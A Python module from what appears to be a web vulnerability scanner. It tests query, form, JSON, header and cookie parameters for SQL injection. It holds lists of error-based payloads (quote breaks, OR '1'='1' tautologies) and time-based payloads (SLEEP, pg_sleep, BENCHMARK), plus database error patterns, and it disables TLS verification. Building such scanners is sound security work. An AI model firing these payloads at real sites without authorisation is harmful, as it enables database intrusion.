import time
import re
from typing import List, Any, Dict

import requests

from src.core.request_rebuilder import rebuild_attack_request
from src.core.vulnerability import Vulnerability
from src.scanners.IScanModule import IScanModule, RequestNode, InjectionPoint

OASTClient = Any


class SqlInjectionModule(IScanModule):
    """Detecta SQLi (error-based + time-based) em pontos de injecao."""

    SQL_ERROR_PATTERNS = [
        r"(?i)sql\s+syntax",
        r"(?i)mysql_",
        r"(?i)you have an error in your sql",
        r"(?i)postgresql.*error",
        r"(?i)pg_",
        r"(?i)microsoft sql server",
        r"(?i)odbc driver",
        r"(?i)ora-\d{5}",
        r"(?i)sqlite.*error",
        r"(?i)sqlstate\[\w+\]",
    ]

    def run_test(
        self,
        request_node: RequestNode,
        injection_point: InjectionPoint,
        oast_client: OASTClient
    ) -> List[Vulnerability]:
        relevant_locations = {'QUERY', 'BODY_FORM', 'BODY_JSON', 'HEADER', 'COOKIE'}
        if injection_point['location'] not in relevant_locations:
            return []

        session = requests.Session()
        session.verify = False
        session.timeout = 5

        # Error-based payloads
        error_payloads = [
            "'",
            '"',
            "'-- ",
            "\")",
            "' OR '1'='1'-- ",
            '" OR "1"="1"-- ',
        ]

        for payload in error_payloads:
            try:
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                response = session.send(request_to_send, timeout=session.timeout)
                if self._has_sql_error(response.text):
                    snippet = self._extract_error_snippet(response.text)
                    return [
                        Vulnerability(
                            name="SQL Injection (Error-Based)",
                            severity="High",
                            description=(
                                "SQL Injection detectada por mensagens de erro no response. "
                                f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Match: {snippet}",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        # Time-based payloads
        time_payloads = [
            "' AND SLEEP(3)-- ",
            "' OR SLEEP(3)-- ",
            '" AND SLEEP(3)-- ',
            "' AND pg_sleep(3)-- ",
            "' AND BENCHMARK(3000000,MD5(1))-- ",
        ]

        for payload in time_payloads:
            try:
                start = time.time()
                request_to_send = rebuild_attack_request(request_node, injection_point, payload)
                session.send(request_to_send, timeout=session.timeout)
                elapsed = time.time() - start
                if elapsed >= 3:
                    return [
                        Vulnerability(
                            name="SQL Injection (Time-Based)",
                            severity="High",
                            description=(
                                "Possivel SQL Injection por atraso na resposta. "
                                f"Payload '{payload}' em '{injection_point['parameter_name']}'."
                            ),
                            evidence=f"Payload: {payload} | Delay: {elapsed:.2f}s",
                            request_node_id=request_node['id'],
                            injection_point_id=injection_point['id']
                        )
                    ]
            except requests.exceptions.RequestException:
                continue
            except Exception:
                return []

        return []

    def _has_sql_error(self, body: str) -> bool:
        return any(re.search(pattern, body or "") for pattern in self.SQL_ERROR_PATTERNS)

    def _extract_error_snippet(self, body: str) -> str:
        text = body or ""
        for pattern in self.SQL_ERROR_PATTERNS:
            match = re.search(pattern, text)
            if match:
                start = max(match.start() - 80, 0)
                end = min(match.end() + 80, len(text))
                return text[start:end]
        return text[:200]
